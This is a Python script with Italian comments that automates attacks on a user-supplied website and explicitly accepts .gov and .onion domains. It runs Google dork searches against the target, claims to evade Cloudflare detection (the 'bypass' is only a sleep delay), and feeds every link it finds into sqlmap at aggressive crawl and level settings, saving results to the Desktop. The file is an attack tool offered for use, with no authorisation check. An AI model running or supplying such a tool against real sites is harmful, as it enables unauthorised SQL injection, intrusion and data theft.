import os
import subprocess
import requests
import socket
from bs4 import BeautifulSoup
import re
import time

def run_command(command):
    """Esegui un comando di sistema e restituisci l'output."""
    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return result.stdout, result.stderr

def salva_su_desktop(file_name, data):
    """Salva i dati in un file sul Desktop."""
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    if not os.path.exists(desktop_path):
        os.makedirs(desktop_path)
    
    file_path = os.path.join(desktop_path, file_name)
    with open(file_path, 'a') as file:
        file.write(data + '\n')
    print(f"Risultati salvati in: {file_path}")

def risolvi_ip(dominio):
    """Risolvi l'indirizzo IP reale del dominio."""
    try:
        ip = socket.gethostbyname(dominio)
        print(f"IP reale di {dominio}: {ip}")
        return ip
    except socket.gaierror:
        print(f"Impossibile risolvere l'IP per il dominio {dominio}.")
        return None

def supera_cloudflare(session, url, headers):
    """Effettua richieste superando Cloudflare con delay e user-agent casuale."""
    time.sleep(5)  # Delay per evitare rilevamento
    try:
        response = session.get(url, headers=headers, timeout=10)
        return response
    except requests.exceptions.RequestException as e:
        print(f"Errore durante il superamento di Cloudflare: {e}")
        return None

def esegui_sqlmap(url):
    """Esegui SQLMap su URL vulnerabili."""
    if not url.startswith("http"):  # Controlla che l'URL sia valido
        url = "http://" + url
    comando = ["sqlmap", "-u", url, "--batch", "--crawl=3", "--level=5"]
    print(f"\nEsecuzione SQLMap su {url}...")
    stdout, stderr = run_command(comando)
    if stdout:
        print(f"Risultati SQLMap:\n", stdout)
        salva_su_desktop(f"sqlmap_{url.replace('://', '_').replace('/', '_')}.txt", stdout)
    if stderr:
        print(f"Errori durante SQLMap:\n", stderr)

def esegui_dorks_e_sqlmap(dominio, dorks_file):
    """Esegui le Google Dorks per trovare pagine vulnerabili e SQLMap per verificarle."""
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
    }
    
    with open(dorks_file, 'r') as file:
        dorks = [line.strip() for line in file.readlines()]
    
    print(f"\nEsecuzione delle Google Dorks su {dominio}...\n")
    for dork in dorks:
        url_dork = f"https://www.google.com/search?q={dork}+site:{dominio}"
        response = supera_cloudflare(session, url_dork, headers)
        
        if response and response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            links = [a['href'] for a in soup.find_all('a', href=True) if dominio in a['href']]
            for link in links:
                print(f"Dork: {dork}\nLink: {link}")
                salva_su_desktop(f"google_dorks_{dominio}.txt", f"Dork: {dork}\nLink: {link}")
                esegui_sqlmap(link)  # Verifica le vulnerabilità con SQLMap
        else:
            print(f"Errore nella ricerca con Dork {dork}. Status code: {response.status_code if response else 'N/A'}")

def main():
    """Funzione principale per eseguire le scansioni."""
    dominio = input("Inserisci il dominio del sito web (es: example.com): ")
    
    # Supporto per domini .onion e .gov
    if not re.match(r'^(http://|https://)?([a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,6}|[a-zA-Z0-9\-\.]+\.onion|[a-zA-Z0-9\-\.]+\.gov)$', dominio):
        print("Dominio non valido. Assicurati che sia un dominio pubblico, .onion o .gov.")
        return

    dorks_file = '/mnt/data/google-dorks.txt'  # Caricamento del file di dorks caricato
    ip = risolvi_ip(dominio)
    
    if ip:
        # Esecuzione delle Google Dorks con SQLMap
        esegui_dorks_e_sqlmap(dominio, dorks_file)
    else:
        print("Impossibile proseguire senza l'IP del dominio.")

if __name__ == "__main__":
    main()
